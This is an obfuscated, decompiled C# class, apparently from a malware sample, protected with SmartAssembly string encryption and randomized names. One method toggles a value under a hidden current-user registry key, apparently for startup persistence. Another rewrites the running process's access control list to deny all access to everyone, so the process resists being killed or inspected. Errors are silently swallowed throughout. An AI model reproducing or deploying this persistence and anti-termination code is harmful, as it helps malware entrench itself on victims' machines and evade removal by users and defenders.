using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

internal sealed class GryAFjNRQZh
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr FPIZqwOzvnaCa, int ICJuhimhzEf, [Out] byte[] CYbbRIoesR, uint hNCEIWIEKDYki, out uint kkArQjuywDtMZa);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr blLXQGATfVbLs, int exizzMLmBlC, [In] byte[] nPztUXXfREqD);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void blkAsULpolVVtl(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107404861));
			if (bool_0 && registryKey.GetValue(getString_0(107404752)) != null)
			{
				registryKey.DeleteValue(getString_0(107404752));
			}
			else
			{
				registryKey.SetValue(getString_0(107404752), getString_0(107407987));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor QrBAcBoWsHn(IntPtr intptr_0)
	{
		byte[] cYbbRIoesR = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, cYbbRIoesR, 0u, out var kkArQjuywDtMZa);
		if ((long)kkArQjuywDtMZa > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, cYbbRIoesR = new byte[kkArQjuywDtMZa], kkArQjuywDtMZa, out kkArQjuywDtMZa))
		{
			return null;
		}
		return new RawSecurityDescriptor(cYbbRIoesR, 0);
	}

	private void rDvtWNNhIbnQ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void jASKRDvhuV()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = QrBAcBoWsHn(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			rDvtWNNhIbnQ(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static GryAFjNRQZh()
	{
		Strings.CreateGetStringDelegate(typeof(GryAFjNRQZh));
	}
}
